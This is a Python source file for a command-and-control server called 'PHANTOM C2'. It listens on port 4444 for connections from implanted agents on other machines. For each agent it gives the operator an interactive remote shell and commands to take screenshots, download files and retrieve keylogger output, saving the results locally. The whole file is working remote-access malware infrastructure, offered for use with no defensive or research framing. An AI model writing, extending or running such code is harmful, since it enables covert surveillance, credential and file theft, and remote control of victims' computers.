#!/usr/bin/env python3
# PHANTOM Server — jalankan di mesin lo (C2)
import socket, json, base64, os, sys, threading, time
from datetime import datetime

HOST = "0.0.0.0"
PORT = 4444
agents = {}

def send(sock, data):
    msg = json.dumps(data).encode() + b"\n"
    sock.sendall(msg)

def recv(sock):
    buf = b""
    while not buf.endswith(b"\n"):
        chunk = sock.recv(65535)
        if not chunk: break
        buf += chunk
    return json.loads(buf.strip())

def handle_agent(conn, addr):
    aid = f"{addr[0]}:{addr[1]}"
    try:
        hello = recv(conn)
        info = hello.get("info", {})
        agents[aid] = {"sock": conn, "info": info, "addr": addr}
        print(f"\n\033[92m[+] Agent: {aid} | {info.get('user','?')}@{info.get('host','?')} | {info.get('os','?')}\033[0m")
        print(f"\033[95mPHANTOM\033[0m \033[90m»\033[0m ", end="", flush=True)
    except:
        pass

def agent_shell(aid):
    agent = agents.get(aid)
    if not agent:
        print(f"Agent {aid} not found"); return
    sock = agent["sock"]
    info = agent["info"]
    print(f"\n\033[93m[SESSION]\033[0m {info.get('user')}@{info.get('host')} | \033[90mCtrl+C = back to menu\033[0m")
    while True:
        try:
            cmd = input(f"\033[91m{info.get('host','?')}\033[0m $ ").strip()
            if not cmd: continue
            if cmd == "exit": break
            elif cmd == "screenshot":
                send(sock, {"cmd":"screenshot"})
                res = recv(sock)
                ts = datetime.now().strftime("%H%M%S")
                fname = f"screenshot_{ts}.png"
                with open(fname,"wb") as f:
                    f.write(base64.b64decode(res["data"]))
                print(f"\033[92m[+] Saved: {fname}\033[0m")
            elif cmd.startswith("download "):
                path = cmd[9:]
                send(sock, {"cmd":"download","data":path})
                res = recv(sock)
                if res["type"] == "file":
                    fname = os.path.basename(res["name"])
                    with open(fname,"wb") as f:
                        f.write(base64.b64decode(res["data"]))
                    print(f"\033[92m[+] Downloaded: {fname}\033[0m")
                else:
                    print(res.get("data",""))
            elif cmd.startswith("cd "):
                send(sock, {"cmd":"cd","data":cmd[3:]})
                print(recv(sock).get("data",""))
            elif cmd == "keylog":
                send(sock, {"cmd":"keylog"})
                print(recv(sock).get("data",""))
            elif cmd == "sysinfo":
                send(sock, {"cmd":"sysinfo"})
                print(recv(sock).get("data",""))
            else:
                send(sock, {"cmd":"shell","data":cmd})
                print(recv(sock).get("data","").strip())
        except KeyboardInterrupt:
            print(); break
        except Exception as e:
            print(f"[!] {e}"); break

def menu():
    while True:
        print(f"\n\033[95m────────────────────────────────────────\033[0m")
        print(f"  Agents online: {len(agents)}")
        for i,(aid,a) in enumerate(agents.items()):
            info = a['info']
            print(f"  [{i}] {aid} | {info.get('user','?')}@{info.get('host','?')}")
        print(f"\033[95m────────────────────────────────────────\033[0m")
        try:
            cmd = input(f"\033[95mPHANTOM\033[0m \033[90m»\033[0m ").strip()
            if cmd.isdigit():
                aid = list(agents.keys())[int(cmd)]
                agent_shell(aid)
            elif cmd == "list":
                pass
            elif cmd in ("exit","quit"):
                sys.exit(0)
        except (KeyboardInterrupt, IndexError, EOFError):
            print()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(10)
print(f"\033[95m[PHANTOM C2]\033[0m Listening on {HOST}:{PORT}")

def accept_loop():
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_agent, args=(conn, addr), daemon=True).start()

threading.Thread(target=accept_loop, daemon=True).start()
menu()
